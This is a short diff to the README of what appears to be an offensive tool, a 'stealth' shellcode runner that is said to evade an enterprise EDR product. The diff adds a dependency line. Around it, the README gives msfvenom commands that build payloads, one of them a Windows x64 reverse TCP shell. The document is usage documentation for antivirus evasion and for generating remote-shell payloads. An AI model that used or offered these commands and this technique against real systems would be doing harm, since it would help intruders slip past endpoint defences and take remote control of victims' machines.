@@ -7,6 +7,7 @@ I started writing these tools as a way to both challenge myself and expand upon 
 Currently tested again 1 x enterprise grade EDR solution, however I expect that this technique will be patched soon.
 
 ## :eight_spoked_asterisk: stealth_xml_shellcode_runner.py: 
+Requires: `python3, pycryptodome`
 Usage: `script.py payload.bin`  
 Example payloads: `msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin`  
 `msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > shell.bin`
